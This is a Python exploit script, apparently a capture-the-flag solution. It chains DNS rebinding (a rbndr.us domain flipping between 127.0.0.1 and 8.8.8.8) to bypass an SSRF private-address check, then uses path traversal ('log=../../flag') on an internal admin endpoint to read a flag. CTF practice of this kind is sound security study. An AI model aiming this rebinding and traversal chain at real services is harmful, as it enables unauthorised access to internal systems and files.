import requests
import time

# 7f000001 = 127.0.0.1
# 08080808 = 8.8.8.8
REBIND_DOMAIN = "7f000001.08080808.rbndr.us" 
INSTANCE = "<YOUR_INSTANCE_URL_HERE>"
LOCAL = "http://localhost:3000"
PAYLOAD_URL = f"http://{REBIND_DOMAIN}:3000/admin?log=../../flag"

def exploit(INSTANCE):
    print(f"[*] Payload: {PAYLOAD_URL}")
    
    session = requests.Session()
    
    for i in range(1, 50):
        try:
            r = session.get(f"{INSTANCE}/fetch", params={'url': PAYLOAD_URL}, allow_redirects=False, timeout=3)
            
            if r.status_code == 302:
                print(f"\r[-] Attempt {i}: Blocked (Resolved to Private) - Retrying...", end="")
            elif "permission denied" in r.text:
                 print(f"\r[-] Attempt {i}: Passed check (Public) but Fetch hit Public IP (Not Local) - Retrying...", end="")
            elif "DH{" in r.text:
                print(f"\n[+] SUCCESS! Found flag on attempt {i}:")
                print(r.text)
                return
            else:
                print(f"\n[?] Attempt {i}: Unexpected response: {r.status_code}")
                print(r.text+"\n")

        except Exception as e:
            print(f"\r[!] Error: {e}", end="")
            
        time.sleep(0.5)

if __name__ == "__main__":
    exploit(LOCAL)